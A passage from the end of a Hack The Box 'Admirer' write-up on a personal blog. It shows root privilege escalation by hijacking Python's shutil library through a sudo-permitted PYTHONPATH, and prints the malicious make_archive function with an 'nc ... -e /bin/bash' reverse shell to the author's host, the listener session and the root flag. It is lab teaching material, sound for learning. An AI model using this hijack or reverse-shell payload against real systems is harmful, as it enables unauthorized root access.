<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">PYTHONPATH</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">admin_tasks</span><span class="p">.</span><span class="n">sh</span> 

<span class="p">[[[</span> <span class="n">System</span> <span class="n">Administration</span> <span class="n">Menu</span> <span class="p">]]]</span>
<span class="mi">1</span><span class="p">)</span> <span class="n">View</span> <span class="n">system</span> <span class="n">uptime</span>
<span class="mi">2</span><span class="p">)</span> <span class="n">View</span> <span class="n">logged</span> <span class="ow">in</span> <span class="n">users</span>
<span class="mi">3</span><span class="p">)</span> <span class="n">View</span> <span class="n">crontab</span>
<span class="mi">4</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">passwd</span> <span class="nb">file</span>
<span class="mi">5</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">shadow</span> <span class="nb">file</span>
<span class="mi">6</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">web</span> <span class="n">data</span>
<span class="mi">7</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">DB</span>
<span class="mi">8</span><span class="p">)</span> <span class="n">Quit</span>
<span class="n">Choose</span> <span class="n">an</span> <span class="n">option</span><span class="p">:</span> <span class="mi">6</span>
<span class="n">Running</span> <span class="n">backup</span> <span class="n">script</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">,</span> <span class="n">it</span> <span class="n">might</span> <span class="n">take</span> <span class="n">a</span> <span class="k">while</span><span class="p">...</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="s">"/opt/scripts/backup.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">3</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
    <span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>
<span class="nb">ImportError</span><span class="p">:</span> <span class="n">cannot</span> <span class="kn">import</span> <span class="nn">name</span> <span class="s">'make_archive'</span>
<span class="n">whoami</span>
<span class="n">waldo</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">nano</span> <span class="n">shutil</span><span class="p">.</span><span class="n">py</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">PYTHONPATH</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">admin_tasks</span><span class="p">.</span><span class="n">sh</span> <span class="mi">6</span>
<span class="n">Running</span> <span class="n">backup</span> <span class="n">script</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">,</span> <span class="n">it</span> <span class="n">might</span> <span class="n">take</span> <span class="n">a</span> <span class="k">while</span><span class="p">...</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="s">"/opt/scripts/backup.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">12</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
    <span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s">'gztar'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
<span class="nb">TypeError</span><span class="p">:</span> <span class="n">make_archive</span><span class="p">()</span> <span class="n">takes</span> <span class="mi">0</span> <span class="n">positional</span> <span class="n">arguments</span> <span class="n">but</span> <span class="mi">3</span> <span class="n">were</span> <span class="n">given</span>
<span class="n">whoami</span>
<span class="n">waldo</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">nano</span> <span class="n">shutil</span><span class="p">.</span><span class="n">py</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">PYTHONPATH</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">admin_tasks</span><span class="p">.</span><span class="n">sh</span> <span class="mi">6</span>
<span class="n">Running</span> <span class="n">backup</span> <span class="n">script</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">,</span> <span class="n">it</span> <span class="n">might</span> <span class="n">take</span> <span class="n">a</span> <span class="k">while</span><span class="p">...</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">I</span> <span class="n">am</span> <span class="n">groot</span>
</pre></table></code></div></div><p>After trial and error, I was able to get my library to be loaded and executed, though I did not get a shell like I expected. However, I could see that the output of the <code class="language-plaintext highlighter-rouge">whoami</code> command did appear, so I had proof that I could run commands as root.</p><p>I got an error when trying to exploit this with version one of my evil python library, but that error also confirmed that I was making progress. It told me that my <code class="language-plaintext highlighter-rouge">make_archive()</code> function takes 0 positional arguments but the script that was calling it was feeding it three.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>

<span class="k">def</span> <span class="nf">make_archive</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'echo I am g`whoami`'')
    os.system('</span><span class="n">nc</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">15.57</span> <span class="mi">12345</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="s">')
</span></pre></table></code></div></div><p>I modified my function to take 3 arguments (which I didn’t use for anything), and also added a line to send me a reverse shell since calling a new shell wasn’t working, and then it worked just fine. I didn’t expect the version of <code class="language-plaintext highlighter-rouge">nc</code> that was installed to have <code class="language-plaintext highlighter-rouge">-e</code> capability, but I was happy it did!</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">nano</span> <span class="n">shutil</span><span class="p">.</span><span class="n">py</span> 
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">PYTHONPATH</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">admin_tasks</span><span class="p">.</span><span class="n">sh</span> <span class="mi">6</span>
<span class="n">Running</span> <span class="n">backup</span> <span class="n">script</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">,</span> <span class="n">it</span> <span class="n">might</span> <span class="n">take</span> <span class="n">a</span> <span class="k">while</span><span class="p">...</span>
<span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">I</span> <span class="n">am</span> <span class="n">groot</span>
</pre></table></code></div></div><h3 id="roottxt">Root.txt</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>zweilos@kali:~$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.10.15.57] from (UNKNOWN) [10.10.10.187] 60956
whoami
root
cat /root/root.txt
0f4b44fb50b2c25de7e1464a2ea8b877
</pre></table></code></div></div><p>Thanks to <a href="https://www.hackthebox.eu/home/users/profile/159204"><code class="language-plaintext highlighter-rouge">polarbearer</code></a> and <a href="https://www.hackthebox.eu/home/users/profile/125033"><code class="language-plaintext highlighter-rouge">GibParadox</code></a> for creating this fun and interesting machine that taught me some new ways to take advantage of some common vulnerabilities and misconfigurations.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/setenv/" class="post-tag no-text-decoration" >setenv</a> <a href="/tags/bash/" class="post-tag no-text-decoration" >bash</a> <a href="/tags/sql/" class="post-tag no-text-decoration" >sql</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/adminer/" class="post-tag no-text-decoration" >adminer</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/tags/tj-null/" class="post-tag no-text-decoration" >tj_null</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/polarbearer/" class="post-tag no-text-decoration" >polarbearer</a> <a href="/tags/gibparadox/" class="post-tag no-text-decoration" >gibparadox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Admirer Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/admirer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Admirer Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/admirer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Admirer Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/admirer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/oouch/"><div class="card-body"> <span class="timeago small" > Jun 11, 2020 <i class="unloaded">2020-06-11T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Oouch Writeup</h3><div class="text-muted small"><p> HTB - Oouch Overview This had difficulty Linux machine taught me a lot about the internal workings of a federated access control system, specifically an implementation of Oauth2. Persistence a...</p></div></div></a></div><div class="card"> <a href="/posts/traceback/"><div class="card-body"> <span class="timeago small" > Jun 23, 2020 <i class="unloaded">2020-06-23T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Traceback Writeup</h3><div class="text-muted small"><p> HTB - Traceback Overview Traceback is an easy difficulty Linux machine that gives a good introduction to web shells and tracing the steps of how an attacker compromised a server (then defaced i...</p></div></div></a></div><div class="card"> <a href="/posts/playertwo/"><div class="card-body"> <span class="timeago small" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - PlayerTwo Writeup</h3><div class="text-muted small"><p> HTB - PlayerTwo Overview An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or m...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/magic/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Magic Writeup</p></a> <a href="/posts/cache/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Cache Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
